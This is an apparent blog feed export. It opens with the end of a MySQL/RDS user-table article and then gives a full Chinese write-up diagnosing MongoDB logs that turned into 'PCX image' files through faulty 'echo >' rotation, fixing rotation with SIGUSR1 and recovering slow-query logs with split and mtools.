<h5 id="新增只读用户"><a href="#新增只读用户" class="headerlink" title="新增只读用户"></a>新增只读用户</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">insert into mysql.user_1 values ('%','【用户名】', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('【密码】'));</span><br></pre></td></tr></table></figure>

<h5 id="删除用户命令"><a href="#删除用户命令" class="headerlink" title="删除用户命令"></a>删除用户命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">delete from mysql.user where user='【用户名】';</span><br></pre></td></tr></table></figure>

<h5 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update mysql.user set authentication_string=password('【密码】') where user='【用户名】';</span><br></pre></td></tr></table></figure>

<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>RDS目前使用MySQL版本和官方在系统库上差异还是很大的，若需要搭建RDS到线下自建MySQL5.7的主从时，可以通过此法去实现。</p>
<p>本文中对user表的破解，同样适适用于<code>mysql.db</code> 、<code>mysql.tables_priv</code>表，都破解则可以将权限从用户拓展到库表列。读者可自行实验测试。</p>
]]></content>
      <categories>
        <category>技术广角</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>RDS</tag>
        <tag>主从同步</tag>
      </tags>
  </entry>
  <entry>
    <title>利用split工具解决一次MongoDB日志异常问题</title>
    <url>/2018/08/03/booboo_others/%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>摘要： </p>
<ul>
<li>某天晚上刚到家不久，就接到杭州同事的电话，客户MongoDB集群中的某个分片节点CPU飙高，初步判断是慢查询，现在需要拉取CPU飙高时间段的慢查询。心想拉取慢查询应该很快，不就是个系统日志吗？而且还做了日志切割一天一个，按道理很快搞定的，谁知当天晚上搞了接近三个小时也没搞定。究竟发生了什么？</li>
<li>进入到日志目录一看，目前保留近7天的日志，每天的日志量在23G~24G，我当时就想这个客户数据量这么大！后续发现日志格式本该为普通文本文件确变成了图片格式，究竟为何会文件格式会转变？能否从图片格式中拉取指定时间段的日志呢？</li>
<li>第二天到公司，由于客户环境我们也是第一次接手，因此咱们技术专家团队搞了一个3人的”专家会诊”，经过了一番折腾总算把原因找到了，具体过程请看下文！</li>
</ul>
<a id="more"></a>

<h2 id="故事背景"><a href="#故事背景" class="headerlink" title="故事背景"></a>故事背景</h2><h3 id="数据库明细"><a href="#数据库明细" class="headerlink" title="数据库明细"></a>数据库明细</h3><p>说在前面：</p>
<ul>
<li>数据库：MongoDB集群 4个分片节点</li>
<li>分片节点规格：16核 / 32G CentOS 7.4 64位</li>
<li>数据目录所在磁盘: 300G   49G  252G  17% /data</li>
</ul>
<h3 id="故事情节"><a href="#故事情节" class="headerlink" title="故事情节"></a>故事情节</h3><ul>
<li>某天晚上刚到家不久，就接到杭州同事的电话，客户MongoDB集群中的某个分片节点CPU飙高，初步判断是慢查询，现在需要拉取CPU飙高时间段的慢查询。心想拉取慢查询应该很快，不就是个系统日志吗？而且还做了日志切割一天一个，按道理很快搞定的，谁知当天晚上搞了接近三个小时也没搞定。究竟发生了什么？</li>
<li>进入到日志目录一看，目前保留近7天的日志，每天的日志量在23G~24G，我当时就想这个客户数据量这么大！后续发现日志格式本该为普通文本文件确变成了图片格式，究竟为何会文件格式会转变？能否从图片格式中拉取指定时间段的日志呢？</li>
<li>第二天到公司，由于客户环境我们也是第一次接受，因此咱们技术专家团队搞了一个3人的”专家会诊”，经过了一番折腾总算把原因找到了，具体过程请看下文！</li>
</ul>
<h2 id="复现与剖析"><a href="#复现与剖析" class="headerlink" title="复现与剖析"></a>复现与剖析</h2><h3 id="拉取日志异常"><a href="#拉取日志异常" class="headerlink" title="拉取日志异常"></a>拉取日志异常</h3><p><strong>使用mlogfilter过滤文件时报错说文件非mongodb的日志文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sh_01 booboo]# mlogfilter shard.log.2018-08-01 --from 2018-08-01T15:00:00.000+0800 --to "+1h" --slow 1000 &gt; /alidata/booboo/tf.1</span><br><span class="line">报错:非mongodb日志格式</span><br></pre></td></tr></table></figure>

<p>回到客户服务器检查日志文件格式，明细如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@MONGO-SHARD-18 logs]# file *</span><br><span class="line">shard.log:            PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-25: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-26: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-27: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-28: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-29: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-30: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-31: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-01: PCX ver. 2.5 image data</span><br></pre></td></tr></table></figure>

<p>mongodb的日志正常应该为：<code>ASCII text, with very long lines</code>，但是现在却变成了<code>PCX ver. 2.5 image data</code>。需要弄清楚原因。</p>
<h3 id="日志异常分析"><a href="#日志异常分析" class="headerlink" title="日志异常分析"></a>日志异常分析</h3><ul>
<li>为什么客户每天的日志量达到22个G，并且每天的日志量都是大于等于前一天？很显然，日志截断有问题。</li>
<li>这个是近7天的日志，而日志格式变成了PCX图片格式是为何？</li>
<li>怀疑每次日志轮询时都没有真正截断日志！</li>
</ul>
<p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/01.png" alt=""></p>
<h3 id="分析原日志切割明细"><a href="#分析原日志切割明细" class="headerlink" title="分析原日志切割明细"></a>分析原日志切割明细</h3><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/03.png" alt=""></p>
<p>怀疑与<code>echo &gt;</code>有关，进行验证。</p>
<h3 id="验证echo-gt-与PCX图片头部0a一致"><a href="#验证echo-gt-与PCX图片头部0a一致" class="headerlink" title="验证echo &gt;与PCX图片头部0a一致"></a>验证<code>echo &gt;</code>与<code>PCX图片头部0a一致</code></h3><ol>
<li>建一个空文档<code>log</code>；执行<code>echo &gt; log</code>；通过<code>cat -A log</code>查看文件中插入了一个符号即换行符<code>\n</code></li>
<li>通过<code>hexdump -c log</code> 查看测试文件头部显示为ASCII字符 <code>\n</code></li>
<li>通过<code>hexdump -d log</code> 查看测试文件头部显示为16进制<code>00010</code> 即<code>0a</code></li>
<li>通过<code>vim</code> 用16进制查看文档<code>log</code>可以看到log的文件头部为<code>0a</code>，正是PCX图片的头部</li>
<li>生产环境查看客户有问题的mongodb系统日志文件格式为<code>PCX</code>图片格式</li>
<li>通过<code>hexdump -c log</code> 显示为ASCII字符，生产日志文件头部与测试的log一致，都是<code>\n</code></li>
<li>通过<code>hexdump -d log</code>显示为16进制，生产日志文件头部与测试的log一致<code>00010</code> 即 <code>0a</code></li>
</ol>
<p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/02.png" alt=""></p>
<p><strong>到此验证成功:通过<code>echo &gt; log</code>的方式会往文件头部新增’0a’</strong></p>
<hr>
<h3 id="复现MongoDB日志从ASCII-text转变为PCX-格式"><a href="#复现MongoDB日志从ASCII-text转变为PCX-格式" class="headerlink" title="复现MongoDB日志从ASCII text转变为PCX 格式"></a>复现MongoDB日志从ASCII text转变为PCX 格式</h3><p>在测试环境中复现日志从<code>ASCII text</code>变成<code>PCX ver. 2.5 image data</code></p>
<ol>
<li>通过mongo登陆数据库执行大量的插入操作</li>
<li>通过echo &gt; mongod27017.log  命令尝试清空mongod27017.log</li>
<li>查看截断后的日志文件格式，变成了very short file (no magic)</li>
<li>等文档插入完毕</li>
<li>通过<code>tail -f</code> 查看日志明细，看到确实有日志写入</li>
<li>查看日志格式，发现变成了<code>PCX ver. 2.5 image data</code></li>
</ol>
<p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/05.png" alt=""></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sh_01 ~]# mongo</span><br><span class="line">MongoDB shell version: 3.2.16</span><br><span class="line">connecting to: test</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> db.auth(<span class="string">'test_dev'</span>,<span class="string">'uplooking'</span>)</span></span><br><span class="line">1</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> db.t1.find()</span></span><br><span class="line">&#123; "_id" : ObjectId("5b5ebb6796b8b74a73ee30f6"), "a" : 1, "b" : 2 &#125;</span><br><span class="line">&#123; "_id" : ObjectId("5b5ebb6996b8b74a73ee30f7"), "a" : 1, "b" : 1 &#125;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="keyword">for</span> (i=1;i&lt;200000;i++)&#123;</span></span><br><span class="line">... db.t1.insert(&#123;id:i&#125;)&#125;</span><br><span class="line">WriteResult(&#123; "nInserted" : 1 &#125;)</span><br><span class="line"></span><br><span class="line">[root@sh_01 ~]# cd /alidata/mongodb/logs</span><br><span class="line">[root@sh_01 log]# ll</span><br><span class="line">-rw-r--r-- 1 root root 2182 Aug  3 10:28 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3100 Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line"></span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r-- 1 root root    1 Aug  3 10:29 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3100 Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     very short file (no magic)</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line"></span><br><span class="line">[root@sh_01 log]# tail -f mongod27017.log</span><br><span class="line"></span><br><span class="line">2018-08-03T10:30:21.936+0800 I NETWORK  [initandlisten] connection accepted from 127.0.0.1:43720 #2 (2 connections now open)</span><br><span class="line"></span><br><span class="line">[root@sh_01 log]# ll -h</span><br><span class="line">total 12K</span><br><span class="line">-rw-r--r-- 1 root root 2.8K Aug  3 10:30 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3.1K Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1.5K Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     PCX ver. 2.5 image data</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一边不断产生日志，一边多次执行<span class="built_in">echo</span>&gt; </span></span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     PCX ver. 2.5 image data</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     very short file (no magic)</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# ll -h</span><br><span class="line">total 16K</span><br><span class="line">-rw-r--r-- 1 root root    1 Aug  3 11:28 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3.1K Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1.5K Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">-rw-r--r-- 1 root root 2.9K Aug  3 11:05 mongod27017.log.2018-08-03T03-09-08</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     very short file (no magic)</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     PCX ver. 2.5 image data</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br><span class="line">[root@sh_01 log]# hexdump -c mongod27017.log</span><br><span class="line">0000000  \n  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">0000010  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">*</span><br><span class="line">0000850  \0  \0  \0  \0  \0  \0  \0   2   0   1   8   -   0   8   -   0</span><br><span class="line">0000860   3   T   1   1   :   2   9   :   0   6   .   7   2   9   +   0</span><br><span class="line">0000870   8   0   0       I       A   C   C   E   S   S               [</span><br><span class="line">0000880   c   o   n   n   3   ]       U   n   a   u   t   h   o   r   i</span><br><span class="line">0000890   z   e   d   :       n   o   t       a   u   t   h   o   r   i</span><br><span class="line">00008a0   z   e   d       o   n       t   e   s   t       t   o       e</span><br><span class="line">00008b0   x   e   c   u   t   e       c   o   m   m   a   n   d       &#123;</span><br><span class="line">00008c0       f   i   n   d   :       "   t   1   "   ,       f   i   l</span><br><span class="line">00008d0   t   e   r   :       &#123;   &#125;       &#125;  \n</span><br></pre></td></tr></table></figure>

<p>成功复现了客户的情况：</p>
<ol>
<li><p>第一次<code>echo &gt; log</code>，文件头部新增<code>\n</code></p>
</li>
<li><p>多次<code>echo &gt; log</code>,文件头部如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0000000  \n  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">0000010  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0</span><br><span class="line">*</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>确实是mongodb日志轮询出了问题：</p>
<ol>
<li><code>echo &gt; log</code>会往文件头部插入<code>\n</code>即16进制的<code>0a</code></li>
<li>在数据库正常运行中，对log文件是加了锁的，强制执行<code>echo &gt; log</code>是无法进行覆盖的，会将所有的数据全部置为<code>0</code></li>
<li>强制覆盖后，文件头部变成了无数的空白</li>
</ol>
<h3 id="待解决问题"><a href="#待解决问题" class="headerlink" title="待解决问题"></a>待解决问题</h3><ul>
<li>MongoDB日志轮询方法调整为<strong>kill -SIGUSER1 [mongodpid]</strong></li>
<li>修复目前已经变为图片格式的日志，并拉取15点到16点的日志</li>
</ul>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="MongoDB日志轮询"><a href="#MongoDB日志轮询" class="headerlink" title="MongoDB日志轮询"></a>MongoDB日志轮询</h3><h4 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sh_01 log]# pidof mongod</span><br><span class="line">1828</span><br><span class="line">[root@sh_01 log]# kill -SIGUSER1 1828</span><br><span class="line">-bash: kill: SIGUSER1: invalid signal specification</span><br><span class="line">[root@sh_01 log]# kill -SIGUSR1 1828</span><br><span class="line">[root@sh_01 log]# ll</span><br><span class="line">total 16</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  3 11:09 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3100 Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">-rw-r--r-- 1 root root 2942 Aug  3 11:05 mongod27017.log.2018-08-03T03-09-08</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-03T03-09-08: PCX ver. 2.5 image data</span><br></pre></td></tr></table></figure>

<h4 id="生产环境"><a href="#生产环境" class="headerlink" title="生产环境"></a>生产环境</h4><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/04.png" alt=""></p>
<p>修改日志轮询脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@MONGO-SHARD-18 logs]# cat /etc/init.d/mongo_logspit.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2018/08/02 Apple</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Rotate the MongoDB logs to prevent a single logfile from consuming too much disk space.</span></span><br><span class="line"></span><br><span class="line">cmd=mongod</span><br><span class="line">mongodpath=/opt/mongodb/bin</span><br><span class="line">pidarray=`pidof $&#123;mongodpath&#125;/$cmd`</span><br><span class="line">LOGPATH_SHARD=/data/mongodb/shard1/logs</span><br><span class="line"></span><br><span class="line">for pid in $pidarray;do</span><br><span class="line">if [ $pid ]</span><br><span class="line">then</span><br><span class="line">    kill -SIGUSR1 $pid</span><br><span class="line">fi</span><br><span class="line">done</span><br><span class="line"><span class="meta">#</span><span class="bash">clear logfile more than 7 days</span></span><br><span class="line">cd $LOGPATH_SHARD</span><br><span class="line">find ./ -xdev -mtime +7 -name "shard.log.*" -exec rm -f &#123;&#125;  \;</span><br></pre></td></tr></table></figure>

<p>所有的分片都去执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kill -SIGUSR1 pidof mongod</span><br></pre></td></tr></table></figure>

<p>分片15操作如下：其他分片同样</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[zyadmin@MONGO-SHARD-15 ~]$ sudo -i</span><br><span class="line">[root@MONGO-SHARD-15 ~]# cd /data/mongodb/shard1/logs/</span><br><span class="line">[root@MONGO-SHARD-15 logs]# ll -h</span><br><span class="line">total 1.7G</span><br><span class="line">-rw-r--r-- 1 root root 20G Aug  2 15:27 shard.log</span><br><span class="line">-rw-r--r-- 1 root root 19G Jul 25 23:50 shard.log.2018-07-25</span><br><span class="line">-rw-r--r-- 1 root root 19G Jul 26 23:50 shard.log.2018-07-26</span><br><span class="line">-rw-r--r-- 1 root root 19G Jul 27 23:50 shard.log.2018-07-27</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 28 23:50 shard.log.2018-07-28</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 29 23:50 shard.log.2018-07-29</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 30 23:50 shard.log.2018-07-30</span><br><span class="line">-rw-r--r-- 1 root root 20G Jul 31 23:50 shard.log.2018-07-31</span><br><span class="line">-rw-r--r-- 1 root root 20G Aug  1 23:50 shard.log.2018-08-01</span><br><span class="line">[root@MONGO-SHARD-15 logs]# file *</span><br><span class="line">shard.log:            PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-25: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-26: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-27: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-28: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-29: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-30: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-31: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-01: PCX ver. 2.5 image data</span><br><span class="line">[root@MONGO-SHARD-15 logs]# kill -SIGUSR1 `pidof mongod`</span><br><span class="line">[root@MONGO-SHARD-15 logs]# file *</span><br><span class="line">shard.log:                     ASCII text, with very long lines</span><br><span class="line">shard.log.2018-07-25:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-26:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-27:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-28:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-29:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-30:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-31:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-01:          PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-02T07-27-29: PCX ver. 2.5 image data</span><br><span class="line">[root@MONGO-SHARD-15 logs]# ll -h</span><br><span class="line">total 1.7G</span><br><span class="line">-rw-r--r-- 1 root root 2.0K Aug  2 15:27 shard.log</span><br><span class="line">-rw-r--r-- 1 root root  19G Jul 25 23:50 shard.log.2018-07-25</span><br><span class="line">-rw-r--r-- 1 root root  19G Jul 26 23:50 shard.log.2018-07-26</span><br><span class="line">-rw-r--r-- 1 root root  19G Jul 27 23:50 shard.log.2018-07-27</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 28 23:50 shard.log.2018-07-28</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 29 23:50 shard.log.2018-07-29</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 30 23:50 shard.log.2018-07-30</span><br><span class="line">-rw-r--r-- 1 root root  20G Jul 31 23:50 shard.log.2018-07-31</span><br><span class="line">-rw-r--r-- 1 root root  20G Aug  1 23:50 shard.log.2018-08-01</span><br><span class="line">-rw-r--r-- 1 root root  20G Aug  2 15:27 shard.log.2018-08-02T07-27-29</span><br></pre></td></tr></table></figure>

<h3 id="修复异常日志"><a href="#修复异常日志" class="headerlink" title="修复异常日志"></a>修复异常日志</h3><h4 id="修复思路"><a href="#修复思路" class="headerlink" title="修复思路"></a>修复思路</h4><p>弄清楚日志变更的原因以及复现过程后，不难发现，日志因为头部变化从而导致文件格式变更。因此推测异常日志的组成如下：</p>
<ol>
<li>头部为<code>0a</code></li>
<li>中间全部都是<code>0</code></li>
<li>最后是正常的字符串记录着mongodb的日志信息，类似于<code>2018-08-03T10:30:21.936+0800 I NETWORK  [initandlisten] connection accepted from 127.0.0.1:43720 #2 (2 connections now open)</code>由日志和日志明细组成</li>
</ol>
<p>因此修复的思路如下：</p>
<ul>
<li>23G的日志，首先按照大小6G做切分<code>split -b 6G log</code>，切分成4个文件</li>
<li>查看切分后的日志格式，如果最后一个日志为<code>ASCII text</code>则不再切分否则，将最后一个日志继续切分</li>
<li>循环上一步，直到最后一个文件切分出来没有<code>ASCII text</code>为止</li>
</ul>
<h4 id="操作明细"><a href="#操作明细" class="headerlink" title="操作明细"></a>操作明细</h4><blockquote>
<p>日志轮询的部署距离现在大概4个月</p>
</blockquote>
<ol>
<li><p>第一次将23G的文件以6G切分成4个文件：xaa\xab\xac\xad，查看4个文件的属性为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xaa:               PCX ver. 2.5 image data</span><br><span class="line">xab:               PCX ver. 2.5 image data</span><br><span class="line">xac:               PCX ver. 2.5 image data</span><br><span class="line">xad:                PCX ver. 2.5 image data</span><br></pre></td></tr></table></figure></li>
<li><p>重命名xad为x1第二次切分x1 5G，按照1G切分成5份，查看文件属性</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xaa:               PCX ver. 2.5 image data</span><br><span class="line">xab:               PCX ver. 2.5 image data</span><br><span class="line">xac:               PCX ver. 2.5 image data</span><br><span class="line">xad:                PCX ver. 2.5 image data</span><br><span class="line">xae:                ASCII text, with very long lines</span><br></pre></td></tr></table></figure>
</li>
<li><p>重名xad 为 x2 按照15M的大小切分，查看文件的属性如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xaa:	      PCX ver. 2.5 image data</span><br><span class="line">此处省略。。。</span><br><span class="line">xdo:               PCX ver. 2.5 image data</span><br><span class="line">xdp:               ASCII text, with very long lines</span><br><span class="line">xdq:               ASCII text, with very long lines</span><br><span class="line">xdr:               ASCII text, with very long lines</span><br><span class="line">xds:               ASCII text, with very long lines</span><br><span class="line">xdt:               ASCII text, with very long lines</span><br><span class="line">xdu:               ASCII text, with very long lines</span><br><span class="line">xdv:               UTF-8 Unicode text, with very long lines</span><br><span class="line">xdw:               ASCII text, with very long lines</span><br><span class="line">xdx:               ASCII text, with very long lines</span><br><span class="line">xdy:               ASCII text, with very long lines</span><br></pre></td></tr></table></figure></li>
<li><p>切分后文件类型为<code>ASCII text</code>的文件中找到15点~16点的文档</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sh_01 mongolog_20180801]# head -n 2 xdv</span><br><span class="line">re: "x86_64", version: "Kernel 3.10.0-693.2.2.el7.x86_64" &#125; &#125;</span><br><span class="line">2018-08-01T16:13:44.958+0800 I ACCESS   [conn4972925] Successfully authenticated as principal __system on local</span><br><span class="line">[root@sh_01 mongolog_20180801]# head -n 2 xdu</span><br><span class="line">38422 #4967772 (445 connections now open)</span><br><span class="line">2018-08-01T14:00:10.575+0800 I NETWORK  [thread1] connection accepted from 172.16.0.44:38430 #4967773 (446 connections now open)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li><code>xdv</code> 的头部是<code>2018-08-01T16:13:44.958+0800</code>,因此可以确定15~16的日志在xdu中</li>
<li><code>xdu</code>记录的日志时间段为<code>2018-08-01T14:00:10.575+0800</code>~<code>2018-08-01T16:13:44.958+0800</code></li>
<li>重命名<code>xdu</code>为<code>mongolog.18.14_16</code></li>
</ul>
<h3 id="分析日志"><a href="#分析日志" class="headerlink" title="分析日志"></a>分析日志</h3><h4 id="分析命令"><a href="#分析命令" class="headerlink" title="分析命令"></a>分析命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取08月01号下午3点开始到4点执行时间超过5秒的查询</span></span><br><span class="line">mlogfilter mongolog.18.14_16 --from 2018-08-01T15 --to "+1h" --slow 5000 &gt; slowlog.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获取08月01号下午3点开始到4点语句的执行次数、用时等统计信息</span></span><br><span class="line">mloginfo slowlog.txt  --queries &gt; an_slowlog.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过mplotqueries进行慢查询散点分布图绘制，且只返回前10个</span></span><br><span class="line">mplotqueries slowlog.txt --output-file 01.png --logscale --group-limit 10</span><br></pre></td></tr></table></figure>

<h4 id="慢查询散点分布图"><a href="#慢查询散点分布图" class="headerlink" title="慢查询散点分布图"></a>慢查询散点分布图</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@sh_01 booboo]# mplotqueries slowlog.txt --output-file 01.png --logscale --group-limit 10</span><br><span class="line">                                                                                          </span><br><span class="line">SCATTER plot</span><br><span class="line">   id   #points  group</span><br><span class="line">    1       692  order.order</span><br><span class="line">    2       615  omdmain.item_region_erp</span><br><span class="line">    3         1  omdmain.customer</span><br><span class="line">()</span><br></pre></td></tr></table></figure>
